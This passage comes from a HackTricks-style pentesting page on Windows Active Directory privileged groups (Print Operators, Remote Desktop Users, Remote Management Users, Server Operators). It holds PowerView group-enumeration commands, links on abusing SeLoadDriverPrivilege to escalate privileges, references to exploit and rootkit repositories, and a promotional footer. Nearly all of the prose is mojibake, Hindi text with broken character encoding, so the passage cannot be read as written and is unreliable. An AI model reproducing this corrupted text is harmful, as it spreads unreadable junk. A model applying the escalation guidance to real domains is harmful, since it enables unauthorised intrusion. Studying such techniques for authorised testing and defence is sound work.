рдЗрд╕ рд╕рдореВрд╣ рдХреЛ `Microsoft Exchange Security Groups` рдирд╛рдордХ OU рдХрд╛ **рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг** рднреА рд╣реЛрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рд╕рдореВрд╣ [**`Exchange Windows Permissions`**](privileged-groups-and-token-privileges.md#exchange-windows-permissions) \*\*\*\* (рдЗрд╕ рд╕рдореВрд╣ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ privesc рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ) рд╢рд╛рдорд┐рд▓ рд╣реИред

## рдкреНрд░рд┐рдВрдЯ рдСрдкрд░реЗрдЯрд░реНрд╕

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдпреЛрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЕрдиреБрдорддрд┐рдпрд╛рдБ рджреА рдЬрд╛рддреА рд╣реИрдВ:

* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
* **рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рдкрд░ рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдСрди рдХрд░реЗрдВ** рдФрд░ рдЗрд╕реЗ рдмрдВрдж рдХрд░реЗрдВ
* рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░ рд╕реЗ рдЬреБрдбрд╝реЗ **рдкреНрд░рд┐рдВрдЯрд░реНрд╕ рдХреЛ рдкреНрд░рдмрдВрдзрд┐рдд**, рдмрдирд╛рдиреЗ, рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдФрд░ рд╣рдЯрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпрд╛рдБ

{% hint style="warning" %}
рдпрджрд┐ рдХрдорд╛рдВрдб `whoami /priv`, рдПрдХ рдЕрдиреБрдиреНрдирдд рд╕рдВрджрд░реНрдн рд╕реЗ **`SeLoadDriverPrivilege`** рдирд╣реАрдВ рджрд┐рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ UAC рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред
{% endhint %}

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
SeLoadDriverPrivilege рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ privesc рдХреИрд╕реЗ рдХрд░реЗрдВ, рдЗрд╕ рдкреГрд╖реНрда рдкрд░ рдЬрд╛рдВрдЪреЗрдВ:

{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
{% endcontent-ref %}

## рд░рд┐рдореЛрдЯ рдбреЗрд╕реНрдХрдЯреЙрдк рдпреВрдЬрд░реНрд╕

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреАрд╕реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред\
рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **RDP**:

{% content-ref url="../../network-services-pentesting/pentesting-rdp.md" %}
[pentesting-rdp.md](../../network-services-pentesting/pentesting-rdp.md)
{% endcontent-ref %}

## рд░рд┐рдореЛрдЯ рдкреНрд░рдмрдВрдзрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛

рдЗрд╕ рд╕рдореВрд╣ рдХреЗ рд╕рджрд╕реНрдп **WinRM** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреАрд╕реА рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА:

{% content-ref url="../../network-services-pentesting/5985-5986-pentesting-winrm.md" %}
[5985-5986-pentesting-winrm.md](../../network-services-pentesting/5985-5986-pentesting-winrm.md)
{% endcontent-ref %}

## рд╕рд░реНрд╡рд░ рдСрдкрд░реЗрдЯрд░реНрд╕ <a href="#server-operators" id="server-operators"></a>

рдЗрд╕ рд╕рджрд╕реНрдпрддрд╛ рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдбреЛрдореЗрди рдХрдВрдЯреНрд░реЛрд▓рд░реНрд╕ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓рддреА рд╣реИ:

* рд╕реНрдерд╛рдиреАрдп рд░реВрдк рд╕реЗ рд▓реЙрдЧ рдСрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐
* рдлрд╛рдЗрд▓реЛрдВ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХрд╛ рдмреИрдХрдЕрдк рд▓реЗрдирд╛
* \`\`[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) рдФрд░ [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)
* рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рд╕рдордп рдмрджрд▓рдирд╛
* рд╕рдордп рдХреНрд╖реЗрддреНрд░ рдмрджрд▓рдирд╛
* рджреВрд░рд╕реНрде рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдЬрдмрд░рди рд╢рдЯрдбрд╛рдЙрди рдХрд░рдирд╛
* рдлрд╛рдЗрд▓реЛрдВ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдирд╛
* рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╢рдЯрдбрд╛рдЙрди рдХрд░рдирд╛
* рд╕реНрдерд╛рдиреАрдп рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг

рд╕рдореВрд╣ рдХреЗ **рд╕рджрд╕реНрдпреЛрдВ** рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## рд╕рдВрджрд░реНрдн <a href="#references" id="references"></a>

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**.
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>
